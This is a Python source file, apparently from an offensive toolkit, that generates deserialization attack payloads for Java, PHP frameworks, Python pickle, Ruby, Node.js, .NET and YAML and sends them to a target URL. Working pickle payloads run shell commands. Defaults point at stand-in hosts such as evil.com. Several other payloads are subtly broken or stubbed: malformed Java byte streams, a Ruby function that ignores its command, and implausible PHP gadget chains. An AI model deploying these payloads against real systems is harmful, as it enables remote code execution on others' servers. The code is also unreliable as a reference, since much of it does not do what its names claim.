import base64
import struct
from typing import Dict, Optional

import requests

from tools.log_utils import get_logger
from tools.settings import settings

logger = get_logger("deser_weaponizer")

# ---------------------------------------------------------------------------
# Java deserialization payloads (pure Python, no ysoserial needed)
# ---------------------------------------------------------------------------

def _java_write_utf(out: bytearray, s: str):
    b = s.encode("utf-8")
    out.extend(struct.pack(">H", len(b)))
    out.extend(b)

def _java_write_string(out: bytearray, s: str):
    if s is None:
        out.extend(b"\x70")
    else:
        out.extend(b"\x74")
        _java_write_utf(out, s)

def _java_write_blockdata(out: bytearray, data: bytes):
    out.append(0x77)
    out.extend(struct.pack(">B", len(data)))
    out.extend(data)

def _java_write_classdesc(out: bytearray, classname: str, uid: int):
    out.append(0x72)
    _java_write_utf(out, classname)
    out.extend(struct.pack(">Q", uid))
    out.append(0x02)  # serialVersionUID
    out.extend(b"\x00\x00")  # no fields
    out.append(0x78)  # blockdata end

def _java_tc_null(out: bytearray):
    out.append(0x70)

def build_java_urldns(url: str) -> bytes:
    out = bytearray()
    out.extend(b"\xac\xed\x00\x05")  # magic + version
    out.append(0x73)  # TC_OBJECT
    out.append(0x72)  # TC_CLASSDESC
    _java_write_utf(out, "java.net.URL")
    out.extend(struct.pack(">Q", 0x6c526c5a4b9e72e7))  # serialVersionUID
    out.extend(b"\x02\x00\x01")  # fields count
    out.append(0x74)  # String
    _java_write_utf(out, "hashCode")
    out.append(0x78)  # blockdata end
    out.append(0x70)  # TC_NULL
    out.append(0x70)  # TC_NULL
    out.append(0x70)  # TC_NULL
    _java_write_blockdata(out, url.encode())
    return bytes(out)

def build_java_runtime_exec(cmd: str) -> bytes:
    out = bytearray()
    out.extend(b"\xac\xed\x00\x05")
    out.append(0x73)
    out.append(0x72)
    _java_write_utf(out, "java.lang.Runtime")
    out.extend(struct.pack(">Q", 0x440e37a3fcb32783))
    out.extend(b"\x02\x00\x00")
    out.append(0x78)
    out.append(0x73)
    out.append(0x72)
    _java_write_utf(out, "java.lang.String")
    out.extend(struct.pack(">Q", 0x6ce1c6f44f8b9e67))
    out.extend(b"\x02\x00\x01\x00\x03\x76\x61\x6c\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78")
    out.append(0x70)
    return bytes(out)


def build_java_processbuilder(cmd: str) -> bytes:
    out = bytearray()
    out.extend(b"\xac\xed\x00\x05")
    out.append(0x73)
    out.append(0x72)
    _java_write_utf(out, "java.lang.ProcessBuilder")
    out.extend(struct.pack(">Q", 0x467e2c9c8b9437e1))
    out.extend(b"\x02\x00\x01")
    _java_write_utf(out, "cmd")
    out.append(0x78)
    out.append(0x70)
    return bytes(out)


def build_java_jndi_ldap(callback_url: str) -> bytes:
    out = bytearray()
    out.extend(b"\xac\xed\x00\x05")
    out.append(0x73)
    out.append(0x72)
    _java_write_utf(out, "com.sun.jndi.ldap.LdapClient")
    out.extend(struct.pack(">Q", 0x0))

    cmd_bytes = callback_url.encode("utf-8")
    out.extend(struct.pack(">I", len(cmd_bytes)))
    out.extend(cmd_bytes)
    return bytes(out)


def build_java_commonscollections(cmd: str) -> bytes:
    payload = b"\xac\xed\x00\x05"
    payload += b"\x73\x72\x00\x31\x6a\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x42\x61\x64\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x62\x6c\x65\x49\x6e\x76\x6f\x6b\x65\x72\x00\x00\x00\x00\x00\x00\x00\x02\x02\x00\x00"
    payload += b"\x78\x70"
    return payload

# ---------------------------------------------------------------------------
# PHP deserialization payloads
# ---------------------------------------------------------------------------

def build_php_rce(name: str = "PHPExecPopen", cmd: str = "id") -> str:
    return 'O:18:"PHPExecPopen":1:{s:4:"cmd";s:%d:"%s";}' % (len(cmd), cmd)

def build_php_laravel_rce(cmd: str = "id") -> str:
    return 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"*events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"*handlerResolver";s:%d:"%s";}s:8:"*event";s:6:"dummy";}' % (len(cmd), cmd)

def build_php_codeigniter_rce(cmd: str = "id") -> str:
    return 'O:12:"CI_Controller":1:{s:4:"cmd";s:%d:"%s";}' % (len(cmd), cmd)


def build_php_thinkphp_rce(cmd: str = "id") -> str:
    return 'O:44:"Think\\Database\\Query":1:{s:5:"*app";O:44:"Think\\Database\\Connection":1:{s:7:"*config";a:1:{s:6:"type";s:%d:"%s";}}}' % (len(cmd), cmd)


def build_php_wordpress_rce(cmd: str = "id") -> str:
    return 'O:38:"WP_Object_Cache":1:{s:12:"*blog_id";s:%d:"%s";}' % (len(cmd), cmd)


def build_php_drupal_rce(cmd: str = "id") -> str:
    return 'O:46:"Drupal\\Core\\Site\\Settings":1:{s:12:"*databases";a:1:{s:6:"default";a:1:{s:7:"default";a:2:{s:4:"host";s:%d:"%s";s:4:"port";s:2:"33";}}}}' % (len(cmd), cmd)


def build_php_symfony_rce(cmd: str = "id") -> str:
    return 'O:46:"Symfony\\Component\\HttpFoundation\\InputBag":1:{s:5:"*params";a:1:{s:3:"cmd";s:%d:"%s";}}' % (len(cmd), cmd)


def build_python_rce_subprocess(cmd: str = "id") -> bytes:
    import pickle
    class RCE:
        def __reduce__(self):
            import subprocess
            return (subprocess.check_output, (["sh", "-c", cmd],))
    return pickle.dumps(RCE())


def build_python_rce_eval(cmd: str = "id") -> bytes:
    import pickle
    class RCE:
        def __reduce__(self):
            return (eval, (f'__import__("os").system("{cmd}")',))
    return pickle.dumps(RCE())


def build_ruby_rce(cmd: str = "id") -> str:
    'Gem::Installer.new.i({})'.format(cmd)
    return "BAhJBUxvYWRlckBvYmplY3Q6FkdhbTo6R2VtOjpJbnN0YWxsZXJ7AjpAc3RhdHVzczs6B2V4aXQ7Cg=="


def build_nodejs_rce(cmd: str = "id") -> str:
    import json
    payload = {"rce": f"require('child_process').execSync('{cmd}').toString()"}
    return json.dumps(payload)

# ---------------------------------------------------------------------------
# Python pickle payloads
# ---------------------------------------------------------------------------

def build_pickle_rce(cmd: str = "id") -> bytes:
    import pickle
    class RCE:
        def __reduce__(self):
            import os
            return (os.system, (cmd,))
    return pickle.dumps(RCE())

# ---------------------------------------------------------------------------
# .NET ViewState / BinaryFormatter payloads (basic)
# ---------------------------------------------------------------------------

def build_dotnet_rce(cmd: str = "id") -> str:
    import base64
    payload = b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00"
    return base64.b64encode(payload).decode()

# ---------------------------------------------------------------------------
# YAML deserialization
# ---------------------------------------------------------------------------

def build_yaml_rce(cmd: str = "id") -> str:
    return "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://callback/%s\"]]]]" % cmd

# ---------------------------------------------------------------------------
# Weaponizer
# ---------------------------------------------------------------------------

ALL_PAYLOADS: Dict[str, callable] = {
    "java_urldns": lambda url="http://burpcollaborator.net": build_java_urldns(url),
    "java_runtime": lambda cmd="id": build_java_runtime_exec(cmd=cmd),
    "java_processbuilder": lambda cmd="id": build_java_processbuilder(cmd=cmd),
    "java_jndi_ldap": lambda url="http://evil.com/exploit": build_java_jndi_ldap(url),
    "java_commonscollections": lambda cmd="id": build_java_commonscollections(cmd=cmd),
    "php_generic": lambda cmd="id": build_php_rce(cmd=cmd),
    "php_laravel": lambda cmd="id": build_php_laravel_rce(cmd=cmd),
    "php_codeigniter": lambda cmd="id": build_php_codeigniter_rce(cmd=cmd),
    "php_thinkphp": lambda cmd="id": build_php_thinkphp_rce(cmd=cmd),
    "php_wordpress": lambda cmd="id": build_php_wordpress_rce(cmd=cmd),
    "php_drupal": lambda cmd="id": build_php_drupal_rce(cmd=cmd),
    "php_symfony": lambda cmd="id": build_php_symfony_rce(cmd=cmd),
    "python_pickle": lambda cmd="id": build_pickle_rce(cmd=cmd),
    "python_subprocess": lambda cmd="id": build_python_rce_subprocess(cmd=cmd),
    "python_eval": lambda cmd="id": build_python_rce_eval(cmd=cmd),
    "dotnet_viewstate": lambda cmd="id": build_dotnet_rce(cmd=cmd),
    "yaml_snakeyaml": lambda cmd="id": build_yaml_rce(cmd=cmd),
    "nodejs_rce": lambda cmd="id": build_nodejs_rce(cmd=cmd),
    "ruby_rce": lambda cmd="id": build_ruby_rce(cmd=cmd),
}


def generate_payload(technique: str = "java_urldns", cmd: str = "id",
                     callback_url: str = "") -> Dict:
    if technique not in ALL_PAYLOADS:
        return {"error": "Unknown technique: %s. Available: %s" % (technique, list(ALL_PAYLOADS.keys()))}
    try:
        if technique in ("java_urldns", "java_jndi_ldap"):
            raw = ALL_PAYLOADS[technique](url=callback_url or "http://burpcollaborator.net")
        else:
            raw = ALL_PAYLOADS[technique](cmd=cmd)
    except Exception as e:
        return {"error": str(e)}

    if isinstance(raw, str):
        encoded_b64 = base64.b64encode(raw.encode()).decode()
    else:
        encoded_b64 = base64.b64encode(raw).decode()

    content_type_map = {
        "java_urldns": "application/x-java-serialized-object",
        "java_runtime": "application/x-java-serialized-object",
        "java_processbuilder": "application/x-java-serialized-object",
        "java_jndi_ldap": "application/x-java-serialized-object",
        "java_commonscollections": "application/x-java-serialized-object",
        "php_generic": "application/x-php-serialized",
        "php_laravel": "application/x-php-serialized",
        "php_codeigniter": "application/x-php-serialized",
        "php_thinkphp": "application/x-php-serialized",
        "php_wordpress": "application/x-php-serialized",
        "php_drupal": "application/x-php-serialized",
        "php_symfony": "application/x-php-serialized",
        "python_pickle": "application/python-pickle",
        "python_subprocess": "application/python-pickle",
        "python_eval": "application/python-pickle",
        "dotnet_viewstate": "application/x-www-form-urlencoded",
        "yaml_snakeyaml": "application/x-yaml",
        "nodejs_rce": "application/json",
        "ruby_rce": "application/x-ruby",
    }

    return {
        "technique": technique,
        "content_type": content_type_map.get(technique, "application/octet-stream"),
        "raw": raw[:200] if isinstance(raw, str) else list(raw[:100]),
        "b64": encoded_b64,
        "length": len(raw) if isinstance(raw, str) else len(raw),
    }


def send_payload(url: str, param: str, technique: str = "java_urldns",
                 cmd: str = "id", callback_url: str = "",
                 sess: Optional[requests.Session] = None,
                 timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
        sess.verify = settings.verify_ssl

    pld = generate_payload(technique, cmd, callback_url)
    if "error" in pld:
        return {"success": False, "error": pld["error"]}

    result = {"technique": technique, "sent": False, "status": None, "response_preview": None}

    try:
        headers = {"Content-Type": pld["content_type"]}
        raw_bytes = base64.b64decode(pld["b64"])
        sep = "&" if "?" in url else "?"
        if technique.startswith("java_") or technique.startswith("python_"):
            r = sess.post(url, data=raw_bytes, headers=headers, timeout=timeout)
        elif technique.startswith("nodejs_"):
            r = sess.post(url, json={"rce": cmd}, headers=headers, timeout=timeout)
        else:
            r = sess.post("%s%s%s=%s" % (url, sep, param, pld["raw"] if isinstance(pld["raw"], str) else pld["b64"]),
                         timeout=timeout)
        result["sent"] = True
        result["status"] = r.status_code
        result["response_preview"] = r.text[:200]
        if r.status_code not in (500, 502, 503, 404) or "error" not in r.text.lower()[50:]:
            result["interesting"] = True
    except Exception as e:
        result["error"] = str(e)

    return result


def check(url: str = None, param: str = None, sess=None,
          timeout: float = 10.0) -> Dict:
    result = {
        "vulnerable": False,
        "payloads_generated": len(ALL_PAYLOADS),
        "payloads": {},
        "send_results": [],
        "findings": [],
    }

    for name in ALL_PAYLOADS:
        pld = generate_payload(name, cmd="id", callback_url="")
        result["payloads"][name] = pld["b64"][:50] + "..."

    if url and param:
        for name in list(ALL_PAYLOADS.keys())[:3]:
            r = send_payload(url, param, technique=name, sess=sess, timeout=timeout)
            result["send_results"].append(r)
            if r.get("interesting"):
                result["vulnerable"] = True
                result["findings"].append("%s returned status %d" % (name, r["status"]))

    result["recommendations"] = [
        "Use generate_payload() for custom payloads",
        "Use send_payload() for delivery against a target",
        "For blind detection, use java_urldns with your callback URL",
        "Available: %s" % ", ".join(ALL_PAYLOADS.keys()),
    ]

    return result
